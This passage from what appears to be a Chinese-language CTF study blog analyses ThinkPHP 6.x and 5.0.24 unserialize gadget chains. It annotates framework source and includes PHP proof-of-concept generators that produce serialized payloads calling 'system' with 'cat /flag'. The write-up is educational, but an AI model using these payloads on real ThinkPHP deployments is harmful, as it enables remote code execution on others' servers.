<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fieldName</span> = <span class="keyword">$this</span>-&gt;getRealFieldName(<span class="variable">$name</span>); </span><br><span class="line">    	<span class="comment"># 使得 $fieldName = $name</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$fieldName</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="comment"># 如果键存在则返回值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getRealFieldName</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? <span class="variable">$name</span> : Str::snake(<span class="variable">$name</span>);</span><br><span class="line">    	<span class="comment"># 直接返回name </span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>Attribute/getValue</code>，可以发现如果<code>$this-&gt;withAttr[$fieldName]</code>不是数组的话，就直接进入<code>$closure($value, $this-&gt;data);</code>，看注释掉的内容，也可以意识到这里就是可以直接执行代码的地方了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 检测属性获取器</span></span><br><span class="line">       <span class="variable">$fieldName</span> = <span class="keyword">$this</span>-&gt;getRealFieldName(<span class="variable">$name</span>);</span><br><span class="line">       <span class="variable">$method</span>    = <span class="string">&#x27;get&#x27;</span> . Str::studly(<span class="variable">$name</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;getRelationValue(<span class="variable">$relation</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (in_array(<span class="variable">$fieldName</span>, <span class="keyword">$this</span>-&gt;json) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;getJsonValue(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">//$fieldName = a</span></span><br><span class="line">               <span class="comment">//withAttr[a] = system</span></span><br><span class="line">               <span class="variable">$closure</span> = <span class="keyword">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">               <span class="comment">//value = system(ls,)</span></span><br><span class="line">               <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">           ……………………</span><br></pre></td></tr></table></figure>

<p>思路总结1：</p>
<blockquote>
<ol>
<li>先触发Model类的__destruct方法，使得$this-&gt;lazySave为true进入save函数</li>
<li>要求<code>$this-&gt;withEvent为false</code>，$this-&gt;data不为空，$this-&gt;exits为true，进入updateData函数</li>
<li>直接进入Attribute类的getChangedData函数，会因为之后要去check，所以不能在下一个if语句里return掉，所以返回的$data不能为空，所以要求Attribute里面的$this-&gt;force为true，$this-&gt;data要有值，进入Model，checkAllowFields函数</li>
<li>进入if，要求$this-&gt;field和$this-&gt;schema都为空，在这里$this-&gt;table . $this-&gt;suffix触发Conversion类的toString方法，所以要求$this-&gt;table为true，$this-&gt;suffix实例化Conversion</li>
<li>进入Conversion类，进入toArray函数，进入Attribute类的getAttr函数，传键值，进入getData函数，传入的值不能为空，进入getRealFieldName函数，要求$this-&gt;strict为true，使得直接返回$name，然后要在键值要存在于$this-&gt;data中，使得直接返回$this-&gt;data[$name]，最后以$name=$key $value=$this-&gt;data[$name] $relation=false进入getValue函数</li>
<li>进入if，要求$this-&gt;withAttr[$name]有值并且不是数组，进入$closure = $this-&gt;withAttr[$fieldName];$closure($value, $this-&gt;data);进行代码执行</li>
</ol>
</blockquote>
<p>总结2：</p>
<blockquote>
<p>Model: $this-&gt;lazySave = true;    $this-&gt;withEvent = false;    $this-&gt;exits = true;    $this-&gt;data = [];    $this-&gt;table = true;    $this-&gt;suffix = new Conversion();    $this-&gt;field = [];    $this-&gt;schema = [];</p>
<p>Attribute: $this-&gt;force = true;    $this-&gt;data = [$name=&gt;’cat /flag’];    $this-&gt;strict = true;    $this-&gt;withAttr = [$name=&gt;’system’];    </p>
</blockquote>
<p>poc:（网上的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">Attribute</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">&#x27;hu3sky&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = <span class="keyword">array</span>(<span class="string">&quot;hu3sky&quot;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">RelationShip</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(&#x27;&#x27;);</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> think\model\Pivot(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>poc：（我自己写的 出错了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>()&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">force</span> = <span class="title">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&#x27;yuer&#x27;</span>=&gt;<span class="string">&#x27;cat /flag&#x27;</span>];	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;strict = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">&#x27;yuer&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span> <span class="title">as</span> <span class="title">ConcernAttribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span> <span class="title">as</span> <span class="title">ConcernConversion</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ConcernAttribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ConcernConversion</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exits = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;1&quot;</span>];	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = <span class="keyword">new</span> ConcernConversion();	</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Model</span>();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后生成的payload，注意这里存在<code>parse_url</code>解析漏洞，像之前一样绕过就好了</p>
<p><strong>后记：</strong></p>
<p>总的来说，还是对thinkphp框架不够理解，对namespace和use关键字的运用理解不能</p>
<p>这两天除了这道题，参加的比赛也都要审计大量的代码，感觉头昏脑胀的（悲</p>
<p>代码一看得多了，再加上有些代码还是不能理解透，所以过程中思绪就会有点乱</p>
<p>再努力吧</p>
<h2 id="Thinkphp5-0-24反序列化"><a href="#Thinkphp5-0-24反序列化" class="headerlink" title="Thinkphp5.0.24反序列化"></a>Thinkphp5.0.24反序列化</h2><p><a href="http://www.thinkphp.cn/donate/download/id/1279.html">Thinkphp5.0.24</a></p>
<p><strong>0x01:</strong></p>
<p>因为已经知道是反序列化漏洞了，所以直接审计代码吧。一般常用的魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct</span><br><span class="line">__destruct</span><br><span class="line">__toString</span><br><span class="line">__wakeup</span><br><span class="line">__get</span><br><span class="line">__invoke</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>所以我们可以先自行全局搜索一下可用的魔术方法</p>
<p>1.<code>__destruct</code></p>
<p>一共搜到四个，暂时发现可利用的有一个<code>Windows.php</code>里面的存在可触发<code>toString</code>的点，那就先直接从这里开始</p>
<p>首先是<code>__destruct</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;close(); <span class="comment"># 关闭文件</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;removeFiles(); <span class="comment"># 删除文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># removeFiles</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123; <span class="comment"># 可以触发toString</span></span><br><span class="line">                @unlink(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/de2f1ec402c146c19e084561c3289b84.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那之后可以去找一下<code>toString</code>方法</p>
<p>2.<code>__toString</code></p>
<p>因为前面审计了6.x的反序列化漏洞，所以再找到Model类的时候就直接看了，继续跟踪函数</p>
<p><code>toArray</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$item</span>    = [];</span><br><span class="line">       <span class="variable">$visible</span> = [];</span><br><span class="line">       <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">       <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation); <span class="comment"># 合并两个数组</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// 过滤属性</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;visible)) &#123; <span class="comment"># 如果$this-&gt;visible不为空</span></span><br><span class="line">           <span class="comment"># 如果是比较简单的格式则只会返回值，若值是数组则返回键，若是a.b的格式，会返回a ($this-&gt;visible的内容)</span></span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">           <span class="comment"># array_intersect_key 使用键名比较计算数组的交集 返回前面数组的内容</span></span><br><span class="line">           <span class="comment"># array_flip 交换数组中的键和值</span></span><br><span class="line">           <span class="variable">$data</span>  = array_intersect_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">           <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">           <span class="comment"># 比较两个数组的差值</span></span><br><span class="line">           <span class="variable">$data</span>  = array_diff_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123; <span class="comment"># 遍历</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">               <span class="comment">// 关联模型对象</span></span><br><span class="line">               <span class="comment"># 再执行一边toArray 在思考elseif里面可以不可以触发__call魔术方法</span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (is_array(<span class="variable">$val</span>) &amp;&amp; reset(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">               <span class="comment">// 关联模型数据集</span></span><br><span class="line">               <span class="variable">$arr</span> = [];</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                   <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// 模型属性 直接返回$this-&gt;data </span></span><br><span class="line">               <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123; <span class="comment"># 如果$this-&gt;append不为空</span></span><br><span class="line">           <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123; <span class="comment"># 遍历</span></span><br><span class="line">               <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123; <span class="comment"># 如果是数组</span></span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>); <span class="comment"># 直接返回$name</span></span><br><span class="line">                   <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>(); <span class="comment"># 执行$name函数 返回一个类 $this-&gt;error</span></span><br><span class="line">                       <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>); <span class="comment"># 返回$this-&gt;parent </span></span><br><span class="line">                       <span class="comment"># Output</span></span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123; <span class="comment"># 类里面要存在getBindAttr方法</span></span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr(); <span class="comment"># 执行 返回一个数组</span></span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123; <span class="comment">#$this-&gt;bindAttr = [&#x27;aaa&#x27;]</span></span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123; <span class="comment"># 遍历</span></span><br><span class="line">                                   <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>; <span class="comment"># 判断</span></span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123; </span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="comment"># 不要存在</span></span><br><span class="line">                                       <span class="comment"># $value有值然后直接执行方法 getAttr方法并没有什么特点，但是可以在这里利用</span></span><br><span class="line">                                       <span class="comment"># 然后调用__call方法(Output)</span></span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">           <span class="comment"># 要求$this-&gt;parent为true，且为非自关联 要求(Query)$this-&gt;model=(Model)$this-&gt;parent 然后直接返回$this-&gt;parent</span></span><br><span class="line">           <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// 首先获取关联数据</span></span><br><span class="line">           <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;getRelation();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . get_class(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>3.<code>__call</code></p>
<p>在<code>OutPut</code>类找到可能可以利用的，其他的都较难利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># method=getAttr args=$attr</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;styles)) &#123;<span class="comment"># $this-&gt;styles = [&#x27;getAttr&#x27;]</span></span><br><span class="line">            array_unshift(<span class="variable">$args</span>, <span class="variable">$method</span>); <span class="comment"># 在数组$args前面插入$method</span></span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>); <span class="comment"># 这个类里的block方法</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以对<code>block</code>方法进行追踪，这里要知道<code>$method=getAttr $args=$key</code>（前面调用的 所以第二个if语句是不可利用的</p>
